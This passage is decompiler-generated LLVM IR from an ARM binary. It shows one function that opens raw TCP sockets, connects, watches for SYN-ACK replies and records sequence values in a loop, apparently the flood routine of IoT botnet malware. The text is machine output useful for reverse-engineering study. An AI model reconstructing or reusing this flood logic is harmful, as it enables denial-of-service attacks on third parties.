  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 6, 5, 7, 51, 8, 50, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 42, 41, 44, 43, 45, 47, 46, 49, 48, 0 }
  uselistorder i32* %r0.global-to-local, { 6, 3, 4, 5, 8, 7, 9, 11, 10, 12, 14, 13, 15, 16, 17, 18, 68, 19, 20, 2, 34, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 38, 35, 36, 37, 39, 41, 40, 42, 1, 43, 45, 44, 47, 46, 48, 49, 51, 50, 52, 54, 53, 56, 55, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 0 }
  uselistorder i32* %lr.global-to-local, { 1, 5, 2, 3, 4, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 0, 17, 18, 19, 20, 21, 22, 23 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 2, 3, 4, 22, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 27, 28, 30, 31, 32, 29, 26, 33, 34, 35 }
  uselistorder i32 134744072, { 1, 0 }
  uselistorder i32 707416650, { 1, 0 }
  uselistorder i32 104859200, { 1, 0 }
  uselistorder i32 33686020, { 1, 0 }
  uselistorder label %dec_label_pc_b0e0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_af68, { 2, 0, 1 }
  uselistorder label %dec_label_pc_af08, { 1, 0, 2 }
  uselistorder label %dec_label_pc_aefc, { 1, 0 }
  uselistorder label %bb148, { 1, 0 }
  uselistorder label %bb145, { 1, 0 }
  uselistorder label %.thread21, { 1, 0 }
  uselistorder label %dec_label_pc_abb8, { 1, 0 }
  uselistorder label %dec_label_pc_abac, { 1, 0 }
  uselistorder label %dec_label_pc_ab70, { 2, 0, 1 }
  uselistorder label %dec_label_pc_ab68, { 1, 0 }
}

define i32 @function_b138(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_b138:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %tmp = call i8 @__decompiler_undefined_function_1()
  %tmp30 = call i8 @__decompiler_undefined_function_1()
  %tmp31 = call i8 @__decompiler_undefined_function_1()
  %tmp32 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-332 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v1_b13c = urem i32 %arg1, 256
  store i32 %v1_b13c, i32* @fp, align 4
  store i32 %v1_b13c, i32* %r0.global-to-local, align 4
  store i32 16, i32* %r1.global-to-local, align 4
  store i32 %arg4, i32* @r5, align 4
  %v1_b154 = urem i32 %arg3, 256
  store i32 %v1_b154, i32* @r4, align 4
  %v2_b158 = call i32 @function_126cc(i32 %v1_b13c, i32 16)
  store i32 4, i32* %r1.global-to-local, align 4
  %v0_b164 = load i32, i32* @fp, align 4
  store i32 %v0_b164, i32* %r0.global-to-local, align 4
  %v2_b168 = call i32 @function_126cc(i32 %v0_b164, i32 4)
  %v0_b16c = load i32, i32* @r5, align 4
  store i32 %v0_b16c, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_b17c = load i32, i32* @r4, align 4
  store i32 %v0_b17c, i32* %r0.global-to-local, align 4
  %v5_b180 = inttoptr i32 %v0_b16c to i32*
  %v6_b180 = call i32 @function_85e0(i32 %v0_b17c, i32* %v5_b180, i32 2, i32 0)
  %v1_b18c = urem i32 %v6_b180, 256
  store i32 %v1_b18c, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_b198 = load i32, i32* @r5, align 4
  store i32 %v0_b198, i32* %r1.global-to-local, align 4
  %v0_b19c = load i32, i32* @r4, align 4
  store i32 %v0_b19c, i32* %r0.global-to-local, align 4
  %v6_b1a4 = inttoptr i32 %v0_b198 to i32*
  %v7_b1a4 = call i32 @function_85e0(i32 %v0_b19c, i32* %v6_b1a4, i32 3, i32 65535)
  %v0_b1a8 = load i32, i32* @r5, align 4
  store i32 %v0_b1a8, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 %v7_b1a4, i32* @r6, align 4
  %v0_b1b8 = load i32, i32* @r4, align 4
  store i32 %v0_b1b8, i32* %r0.global-to-local, align 4
  %v4_b1bc = inttoptr i32 %v0_b1a8 to i32*
  %v5_b1bc = call i32 @function_85e0(i32 %v0_b1b8, i32* %v4_b1bc, i32 4, i32 64)
  %v1_b1c4 = urem i32 %v5_b1bc, 256
  store i32 %v1_b1c4, i32* %ip.global-to-local, align 4
  %v0_b1c8 = load i32, i32* @r5, align 4
  store i32 %v0_b1c8, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_b1d4 = load i32, i32* @r4, align 4
  store i32 %v0_b1d4, i32* %r0.global-to-local, align 4
  %v6_b1dc = inttoptr i32 %v0_b1c8 to i32*
  %v7_b1dc = call i32 @function_85e0(i32 %v0_b1d4, i32* %v6_b1dc, i32 5, i32 1)
  %v1_b1e8 = urem i32 %v7_b1dc, 256
  store i32 %v1_b1e8, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  %v0_b1f0 = load i32, i32* @r5, align 4
  store i32 %v0_b1f0, i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v0_b1f8 = load i32, i32* @r4, align 4
  store i32 %v0_b1f8, i32* %r0.global-to-local, align 4
  %v5_b200 = inttoptr i32 %v0_b1f0 to i32*
  %v6_b200 = call i32 @function_85e0(i32 %v0_b1f8, i32* %v5_b200, i32 7, i32 65535)
  %v0_b204 = load i32, i32* @r5, align 4
  store i32 %v0_b204, i32* %r1.global-to-local, align 4
  %v3_b208 = mul i32 %v6_b200, 65536
  store i32 %v3_b208, i32* @r7, align 4
  store i32 11, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_b214 = load i32, i32* @r4, align 4
  store i32 %v0_b214, i32* %r0.global-to-local, align 4
  %v4_b218 = inttoptr i32 %v0_b204 to i32*
  %v5_b218 = call i32 @function_85e0(i32 %v0_b214, i32* %v4_b218, i32 11, i32 1)
  %v1_b220 = urem i32 %v5_b218, 256
  store i32 %v1_b220, i32* %ip.global-to-local, align 4
  %v0_b224 = load i32, i32* @r5, align 4
  store i32 %v0_b224, i32* %r1.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_b230 = load i32, i32* @r4, align 4
  store i32 %v0_b230, i32* %r0.global-to-local, align 4
  %v5_b238 = inttoptr i32 %v0_b224 to i32*
  %v6_b238 = call i32 @function_85e0(i32 %v0_b230, i32* %v5_b238, i32 12, i32 1)
  %v1_b240 = urem i32 %v6_b238, 256
  store i32 %v1_b240, i32* %ip.global-to-local, align 4
  %v0_b244 = load i32, i32* @r5, align 4
  store i32 %v0_b244, i32* %r1.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_b250 = load i32, i32* @r4, align 4
  store i32 %v0_b250, i32* %r0.global-to-local, align 4
  %v5_b258 = inttoptr i32 %v0_b244 to i32*
  %v6_b258 = call i32 @function_85e0(i32 %v0_b250, i32* %v5_b258, i32 13, i32 1)
  %v1_b260 = urem i32 %v6_b258, 256
  store i32 %v1_b260, i32* %ip.global-to-local, align 4
  %v0_b264 = load i32, i32* @r5, align 4
  store i32 %v0_b264, i32* %r1.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_b270 = load i32, i32* @r4, align 4
  store i32 %v0_b270, i32* %r0.global-to-local, align 4
  %v5_b278 = inttoptr i32 %v0_b264 to i32*
  %v6_b278 = call i32 @function_85e0(i32 %v0_b270, i32* %v5_b278, i32 14, i32 1)
  %v1_b280 = urem i32 %v6_b278, 256
  store i32 %v1_b280, i32* %ip.global-to-local, align 4
  %v0_b284 = load i32, i32* @r5, align 4
  store i32 %v0_b284, i32* %r1.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_b290 = load i32, i32* @r4, align 4
  store i32 %v0_b290, i32* %r0.global-to-local, align 4
  %v5_b298 = inttoptr i32 %v0_b284 to i32*
  %v6_b298 = call i32 @function_85e0(i32 %v0_b290, i32* %v5_b298, i32 15, i32 1)
  %v1_b2a0 = urem i32 %v6_b298, 256
  store i32 %v1_b2a0, i32* %ip.global-to-local, align 4
  %v0_b2a4 = load i32, i32* @r5, align 4
  store i32 %v0_b2a4, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_b2b0 = load i32, i32* @r4, align 4
  store i32 %v0_b2b0, i32* %r0.global-to-local, align 4
  %v5_b2b8 = inttoptr i32 %v0_b2a4 to i32*
  %v6_b2b8 = call i32 @function_85e0(i32 %v0_b2b0, i32* %v5_b2b8, i32 16, i32 1)
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 %v6_b2b8, i32* %ip.global-to-local, align 4
  store i32 768, i32* %r3.global-to-local, align 4
  %v0_b2c8 = load i32, i32* @r5, align 4
  store i32 %v0_b2c8, i32* %r1.global-to-local, align 4
  %v0_b2cc = load i32, i32* @r4, align 4
  store i32 %v0_b2cc, i32* %r0.global-to-local, align 4
  %v1_b2d0 = urem i32 %v6_b2b8, 256
  store i32 %v1_b2d0, i32* @r8, align 4
  %v4_b2d4 = inttoptr i32 %v0_b2c8 to i32*
  %v5_b2d4 = call i32 @function_85e0(i32 %v0_b2cc, i32* %v4_b2d4, i32 0, i32 768)
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_b2e0 = load i32, i32* @r5, align 4
  store i32 %v0_b2e0, i32* %r1.global-to-local, align 4
  store i32 %v5_b2d4, i32* @sb, align 4
  %v0_b2e8 = load i32, i32* @r4, align 4
  store i32 %v0_b2e8, i32* %r0.global-to-local, align 4
  %v4_b2ec = inttoptr i32 %v0_b2e0 to i32*
  %v5_b2ec = call i32 @function_85e0(i32 %v0_b2e8, i32* %v4_b2ec, i32 1, i32 1)
  store i32 3, i32* %r1.global-to-local, align 4
  %v1_b2f8 = urem i32 %v5_b2ec, 256
  store i32 %v1_b2f8, i32* %r3.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v3_b308 = call i32 @function_123e0(i32 2, i32 3, i32 6)
  store i32 %v3_b308, i32* %r0.global-to-local, align 4
  %v0_b30c = load i32, i32* @r7, align 4
  %v3_b30c = udiv i32 %v0_b30c, 65536
  store i32 %v3_b30c, i32* %r1.global-to-local, align 4
  %v7_b310 = icmp eq i32 %v3_b308, -1
  store i1 %v7_b310, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_b310, label %dec_label_pc_b56c, label %dec_label_pc_b320

dec_label_pc_b320:                                ; preds = %dec_label_pc_b138
  store i32 1, i32* %stack_var_-40, align 4
  %v6_b328 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v6_b328, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v6_b33c = call i32 @function_123b0(i32 %v3_b308, i32 0, i32 3, i32* nonnull %stack_var_-40, i32 4)
  store i32 %v6_b33c, i32* %r0.global-to-local, align 4
  %v7_b340 = icmp eq i32 %v6_b33c, -1
  store i1 %v7_b340, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_b340, label %dec_label_pc_b564, label %dec_label_pc_b348

dec_label_pc_b348:                                ; preds = %dec_label_pc_b320
  %v0_b348 = load i32, i32* @fp, align 4
  %v2_b348 = icmp eq i32 %v0_b348, 0
  store i1 %v2_b348, i1* %cpsr_z.global-to-local, align 1
  %v0_b34c = load i32, i32* @r6, align 4
  %v3_b34c = mul i32 %v0_b34c, 65536
  store i32 %v3_b34c, i32* %r0.global-to-local, align 4
  %v3_b350 = urem i32 %v0_b34c, 65536
  store i32 %v3_b350, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %tmp72 = icmp slt i32 %v0_b348, 1
  br i1 %tmp72, label %.thread18, label %dec_label_pc_b374.preheader

.thread18:                                        ; preds = %dec_label_pc_b348
  store i32 0, i32* %stack_var_-40, align 4
  br label %dec_label_pc_b7f8

dec_label_pc_b374.preheader:                      ; preds = %dec_label_pc_b348
  %v5_b358 = load i32, i32* @r7, align 4
  %v8_b358 = udiv i32 %v5_b358, 16777216
  %tmp73 = udiv i32 %v0_b34c, 256
  %v8_b35c = urem i32 %tmp73, 256
  store i32 %v8_b35c, i32* %r0.global-to-local, align 4
  store i32 0, i32* %stack_var_-40, align 4
  %v3_b460 = icmp ugt i32 %v0_b30c, -65537
  %v2_b484 = ptrtoint i32* %stack_var_-60 to i32
  %v3_b490 = bitcast i32* %stack_var_-60 to %sockaddr*
  %v2_b4c0 = ptrtoint i32* %stack_var_-76 to i32
  %v2_b4c4 = ptrtoint i32* %stack_var_-44 to i32
  %v2_b4c8 = ptrtoint i32* %stack_var_-332 to i32
  %v4_b514 = zext i8 %tmp31 to i32
  %v4_b518 = zext i8 %tmp30 to i32
  %v4_b524 = mul nuw nsw i32 %v4_b518, 256
  %v4_b534 = zext i8 %tmp to i32
  %v1_b538 = and i32 %v4_b534, 18
  %v2_b53c = icmp eq i32 %v1_b538, 18
  %v1_b470 = mul nuw nsw i32 %v3_b30c, 256
  %v4_b474 = and i32 %v1_b470, 65280
  %v5_b474 = or i32 %v8_b358, %v4_b474
  %v3_b47893 = udiv i32 %v4_b474, 256
  %v1_b47c = trunc i32 %v3_b47893 to i8
  %v1_b640 = mul i32 %v0_b34c, 256
  %v4_b648 = and i32 %v1_b640, 65280
  %sext = mul i32 %v6_b180, 16777216
  %v4_b658 = sdiv i32 %sext, 16777216
  %sext5 = mul i32 %v5_b1bc, 16777216
  %v4_b67c = sdiv i32 %sext5, 16777216
  %v5_b524 = or i32 %v4_b514, %v4_b524
  %v1_b544 = and i32 %v4_b534, 5
  %v2_b544 = icmp eq i32 %v1_b544, 0
  %v1_b480 = trunc i32 %v8_b358 to i8
  %v5_b648 = or i32 %v8_b35c, %v4_b648
  %v1_b668 = trunc i32 %v4_b658 to i8
  %v1_b748 = urem i32 %v5_b218, 2
  %tmp94 = sub nsw i32 0, %v1_b748
  %v4_b750 = and i32 %tmp94, 32
  %v1_b760 = urem i32 %v6_b238, 2
  %tmp95 = sub nsw i32 0, %v1_b760
  %v4_b768 = and i32 %tmp95, 16
  %v1_b778 = urem i32 %v6_b258, 2
  %tmp96 = sub nsw i32 0, %v1_b778
  %v4_b780 = and i32 %tmp96, 8
  %v1_b790 = urem i32 %v6_b278, 2
  %tmp97 = sub nsw i32 0, %v1_b790
  %v4_b798 = and i32 %tmp97, 4
  %v1_b7a8 = urem i32 %v6_b298, 2
  %tmp98 = sub nsw i32 0, %v1_b7a8
  %v3_b7b0 = and i32 %tmp98, 2
  br label %dec_label_pc_b374

dec_label_pc_b374:                                ; preds = %dec_label_pc_b7e4, %dec_label_pc_b54c, %dec_label_pc_b374.preheader
  store i32 %v8_b35c, i32* %r3.global-to-local, align 4
  %v0_b380 = load i32, i32* @sb, align 4
  %v1_b380 = add i32 %v0_b380, 40
  store i32 %v1_b380, i32* @sl, align 4
  br label %dec_label_pc_b384

dec_label_pc_b384:                                ; preds = %dec_label_pc_b558, %dec_label_pc_b374
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_b390 = call i32 @function_123e0(i32 2, i32 1, i32 0)
  store i32 %v3_b390, i32* %r0.global-to-local, align 4
  %v7_b394 = icmp eq i32 %v3_b390, -1
  store i1 %v7_b394, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_b390, i32* @r7, align 4
  br i1 %v7_b394, label %dec_label_pc_b7e4, label %dec_label_pc_b3a0

dec_label_pc_b3a0:                                ; preds = %dec_label_pc_b384
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 0, i32* @r2, align 4
  %v2_b3a8 = call i32 @function_11a2c(i32 %v3_b390, i32 3)
  store i32 4, i32* %r1.global-to-local, align 4
  %v1_b3b0 = or i32 %v2_b3a8, 2048
  store i32 %v1_b3b0, i32* @r2, align 4
  %v0_b3b4 = load i32, i32* @r7, align 4
  store i32 %v0_b3b4, i32* %r0.global-to-local, align 4
  %v2_b3b8 = call i32 @function_11a2c(i32 %v0_b3b4, i32 4)
  store i32 %v2_b3b8, i32* %r0.global-to-local, align 4
  %v3_b3bc = load i32, i32* %stack_var_-40, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v5_b3cc = mul i32 %v3_b3bc, 24
  store i32 %v5_b3cc, i32* %r1.global-to-local, align 4
  store i32 %arg2, i32* %ip.global-to-local, align 4
  store i32 2, i32* %stack_var_-60, align 4
  %v2_b3dc = add i32 %v5_b3cc, %arg2
  store i32 %v2_b3dc, i32* %r2.global-to-local, align 4
  %v1_b3e0 = add i32 %v2_b3dc, 20
  %v2_b3e0 = inttoptr i32 %v1_b3e0 to i8*
  %v3_b3e0 = load i8, i8* %v2_b3e0, align 1
  %v4_b3e0 = zext i8 %v3_b3e0 to i32
  store i32 %v4_b3e0, i32* %r3.global-to-local, align 4
  %v2_b3e4 = icmp ugt i8 %v3_b3e0, 30
  %v7_b3e4 = icmp eq i8 %v3_b3e0, 31
  store i1 %v7_b3e4, i1* %cpsr_z.global-to-local, align 1
  %v2_b3e8 = xor i1 %v7_b3e4, true
  %v3_b3e8 = and i1 %v2_b3e4, %v2_b3e8
  %v5_b3e8 = add i32 %v2_b3dc, 16
  %v6_b3e8 = inttoptr i32 %v5_b3e8 to i32*
  %v7_b3e8 = load i32, i32* %v6_b3e8, align 4
  br i1 %v3_b3e8, label %dec_label_pc_b454, label %dec_label_pc_b3f4

dec_label_pc_b3f4:                                ; preds = %dec_label_pc_b3a0
  store i32 %v7_b3e8, i32* @r4, align 4
  %v0_b3f8 = call i32 @function_e978()
  store i32 %v0_b3f8, i32* %r0.global-to-local, align 4
  %v3_b3fc = load i32, i32* %stack_var_-40, align 4
  store i32 %arg2, i32* %lr.global-to-local, align 4
  %v5_b408 = mul i32 %v3_b3fc, 24
  %v0_b40c = load i32, i32* @r4, align 4
  %v2_b410 = add i32 %v5_b408, %arg2
  store i32 %v2_b410, i32* %r1.global-to-local, align 4
  %v1_b414 = and i32 %v0_b40c, 65280
  store i32 %v1_b414, i32* %r3.global-to-local, align 4
  %v1_b40c = udiv i32 %v0_b40c, 256
  %v3_b418 = and i32 %v1_b40c, 65280
  store i32 %v3_b418, i32* %r2.global-to-local, align 4
  %v3_b41c = mul i32 %v0_b40c, 16777216
  store i32 %v3_b41c, i32* %ip.global-to-local, align 4
  %v1_b420 = add i32 %v2_b410, 20
  %v2_b420 = inttoptr i32 %v1_b420 to i8*
  %v3_b420 = load i8, i8* %v2_b420, align 1
  %v4_b420 = zext i8 %v3_b420 to i32
  store i32 %v4_b420, i32* %lr.global-to-local, align 4
  %v4_b424 = mul nuw nsw i32 %v1_b414, 256
  %v5_b424 = or i32 %v4_b424, %v3_b41c
  store i32 %v5_b424, i32* %ip.global-to-local, align 4
  %v2_b42c = call i32 @llvm.bswap.i32(i32 %v0_b40c)
  %v7_b430 = lshr i32 %v0_b3f8, %v4_b420
  %v8_b430 = add i32 %v7_b430, %v2_b42c
  store i32 %v8_b430, i32* %r2.global-to-local, align 4
  %v3_b43c = mul i32 %v8_b430, 16777216
  %v1_b440 = and i32 %v8_b430, 65280
  store i32 %v1_b440, i32* %r0.global-to-local, align 4
  %v4_b444 = mul nuw nsw i32 %v1_b440, 256
  %v5_b444 = or i32 %v4_b444, %v3_b43c
  store i32 %v5_b444, i32* %r1.global-to-local, align 4
  %v2_b44c = call i32 @llvm.bswap.i32(i32 %v8_b430)
  br label %dec_label_pc_b454

dec_label_pc_b454:                                ; preds = %dec_label_pc_b3a0, %dec_label_pc_b3f4
  %storemerge25 = phi i32 [ %v2_b44c, %dec_label_pc_b3f4 ], [ %v7_b3e8, %dec_label_pc_b3a0 ]
  store i32 %v3_b30c, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i1 %v3_b460, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_b460, label %dec_label_pc_b574, label %dec_label_pc_b468

dec_label_pc_b468:                                ; preds = %dec_label_pc_b454
  store i32 %v8_b358, i32* %ip.global-to-local, align 4
  store i32 %v5_b474, i32* %r3.global-to-local, align 4
  store i32 %v3_b47893, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_b484

dec_label_pc_b484:                                ; preds = %dec_label_pc_b574, %dec_label_pc_b468
  %stack_var_-57.0 = phi i8 [ %v1_b57c, %dec_label_pc_b574 ], [ %v1_b47c, %dec_label_pc_b468 ]
  %storemerge = phi i8 [ %v1_b574, %dec_label_pc_b574 ], [ %v1_b480, %dec_label_pc_b468 ]
  store i32 %v2_b484, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v0_b48c = load i32, i32* @r7, align 4
  store i32 %v0_b48c, i32* %r0.global-to-local, align 4
  %v4_b490 = call i32 @function_1223c(i32 %v0_b48c, %sockaddr* nonnull %v3_b490, i32 16)
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_b498 = call i32 @function_11dc0(i32* null)
  store i32 %v2_b498, i32* %r0.global-to-local, align 4
  store i32 %v2_b498, i32* @r4, align 4
  %v9_b4f8 = icmp eq i32 %tmp32, %storemerge25
  %v4_b51c = zext i8 %storemerge to i32
  %v4_b520 = zext i8 %stack_var_-57.0 to i32
  %. = zext i1 %v9_b4f8 to i32
  %v9_b50c = icmp eq i1 %v9_b4f8, false
  %v4_b528 = mul nuw nsw i32 %v4_b520, 256
  %v5_b528 = or i32 %v4_b528, %v4_b51c
  %v9_b52c = icmp eq i32 %v5_b528, %v5_b524
  br label %dec_label_pc_b4b4

dec_label_pc_b4a4:                                ; preds = %.thread23, %dec_label_pc_b514, %dec_label_pc_b544, %bb75
  %v2_b4a4 = call i32 @function_11dc0(i32* null)
  %v0_b4a8 = load i32, i32* @r4, align 4
  %v2_b4a8 = sub i32 %v2_b4a4, %v0_b4a8
  store i32 %v2_b4a8, i32* %r0.global-to-local, align 4
  %v7_b4ac = icmp eq i32 %v2_b4a8, 10
  store i1 %v7_b4ac, i1* %cpsr_z.global-to-local, align 1
  %v8_b4b0 = icmp sgt i32 %v2_b4a8, 10
  br i1 %v8_b4b0, label %dec_label_pc_b558, label %dec_label_pc_b4b4

dec_label_pc_b4b4:                                ; preds = %dec_label_pc_b4a4, %dec_label_pc_b484
  store i32 256, i32* %r2.global-to-local, align 4
  store i32 16, i32* %stack_var_-44, align 4
  store i32 %v2_b4c0, i32* %lr.global-to-local, align 4
  store i32 %v2_b4c4, i32* %ip.global-to-local, align 4
  store i32 %v2_b4c8, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 %v3_b308, i32* %r0.global-to-local, align 4
  %v7_b4dc = call i32 @function_1231c(i32 %v3_b308, i32* nonnull %stack_var_-332, i32 256, i32 16384, i32 %v2_b4c0, i32 %v2_b4c4)
  store i32 %v7_b4dc, i32* %r2.global-to-local, align 4
  %v7_b4e4 = icmp eq i32 %v7_b4dc, -1
  store i1 %v7_b4e4, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r0.global-to-local, align 4
  br i1 %v7_b4e4, label %dec_label_pc_b56c, label %dec_label_pc_b4f0

dec_label_pc_b4f0:                                ; preds = %dec_label_pc_b4b4
  store i32 %tmp32, i32* %r3.global-to-local, align 4
  store i32 %., i32* %r1.global-to-local, align 4
  %v7_b504 = icmp eq i32 %v7_b4dc, 40
  store i1 %v7_b504, i1* %cpsr_z.global-to-local, align 1
  %tmp99 = icmp ult i32 %v7_b4dc, 41
  br i1 %tmp99, label %.thread23, label %bb75

.thread23:                                        ; preds = %dec_label_pc_b4f0
  store i32 0, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_b4a4

bb75:                                             ; preds = %dec_label_pc_b4f0
  store i1 %v9_b50c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_b50c, label %dec_label_pc_b4a4, label %dec_label_pc_b514

dec_label_pc_b514:                                ; preds = %bb75
  store i32 %v4_b518, i32* %r1.global-to-local, align 4
  store i32 %v4_b51c, i32* %ip.global-to-local, align 4
  store i32 %v4_b520, i32* %r2.global-to-local, align 4
  store i32 %v5_b524, i32* %r3.global-to-local, align 4
  store i32 %v5_b528, i32* @r5, align 4
  store i1 %v9_b52c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_b52c, label %dec_label_pc_b534, label %dec_label_pc_b4a4

dec_label_pc_b534:                                ; preds = %dec_label_pc_b514
  store i32 %v4_b534, i32* %r2.global-to-local, align 4
  store i32 %v1_b538, i32* %r3.global-to-local, align 4
  store i1 %v2_b53c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_b53c, label %dec_label_pc_b588, label %dec_label_pc_b544

dec_label_pc_b544:                                ; preds = %dec_label_pc_b534
  store i1 %v2_b544, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_b544, label %dec_label_pc_b4a4, label %dec_label_pc_b54c

dec_label_pc_b54c:                                ; preds = %dec_label_pc_b544
  %v0_b54c = load i32, i32* @r7, align 4
  store i32 %v0_b54c, i32* %r0.global-to-local, align 4
  %v1_b550 = call i32 @function_11af0(i32 %v0_b54c)
  store i32 %v1_b550, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_b374

dec_label_pc_b558:                                ; preds = %dec_label_pc_b4a4
  %v0_b558 = load i32, i32* @r7, align 4
  store i32 %v0_b558, i32* %r0.global-to-local, align 4
  %v1_b55c = call i32 @function_11af0(i32 %v0_b558)
  store i32 %v1_b55c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_b384

dec_label_pc_b564:                                ; preds = %dec_label_pc_b320
  store i32 %v3_b308, i32* %r0.global-to-local, align 4
  %v1_b568 = call i32 @function_11af0(i32 %v3_b308)
  store i32 %v1_b568, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_b56c

dec_label_pc_b56c:                                ; preds = %dec_label_pc_b4b4, %dec_label_pc_b138, %dec_label_pc_b564
  %v29_b570 = phi i32 [ %v3_b308, %dec_label_pc_b138 ], [ %v1_b568, %dec_label_pc_b564 ], [ 0, %dec_label_pc_b4b4 ]
  ret i32 %v29_b570

dec_label_pc_b574:                                ; preds = %dec_label_pc_b454
  %v0_b574 = call i32 @function_e978()
  %v1_b574 = trunc i32 %v0_b574 to i8
  store i32 %v0_b574, i32* %r0.global-to-local, align 4
  %v4_b578 = sdiv i32 %v0_b574, 256
  store i32 %v4_b578, i32* %r3.global-to-local, align 4
  %v1_b57c = trunc i32 %v4_b578 to i8
  br label %dec_label_pc_b484

dec_label_pc_b588:                                ; preds = %dec_label_pc_b534
  %v3_b588 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_b588, i32* @r4, align 4
  store i32 %v2_b158, i32* %r2.global-to-local, align 4
  %v3_b590 = mul i32 %v3_b588, 16
  store i32 %v3_b590, i32* %ip.global-to-local, align 4
  %v3_b594 = add i32 %v3_b590, %v2_b158
  %v4_b594 = inttoptr i32 %v3_b594 to i32*
  store i32 %storemerge25, i32* %v4_b594, align 4
  %v0_b598 = load i32, i32* @r6, align 4
  %v1_b598 = add i32 %v0_b598, 4
  %v2_b598 = inttoptr i32 %v1_b598 to i32*
  %v3_b598 = load i32, i32* %v2_b598, align 4
  store i32 %v3_b598, i32* %r0.global-to-local, align 4
  %v1_b5a0 = and i32 %v3_b598, 65280
  store i32 %v1_b5a0, i32* %r1.global-to-local, align 4
  store i32 %v2_b158, i32* %lr.global-to-local, align 4
  %v3_b5a8 = mul i32 %v3_b598, 16777216
  %v4_b5b0 = mul nuw nsw i32 %v1_b5a0, 256
  %v5_b5b0 = or i32 %v4_b5b0, %v3_b5a8
  store i32 %v5_b5b0, i32* %r2.global-to-local, align 4
  %v1_b5b8 = load i32, i32* %ip.global-to-local, align 4
  %v2_b5b8 = add i32 %v1_b5b8, %v2_b158
  store i32 %v2_b5b8, i32* %ip.global-to-local, align 4
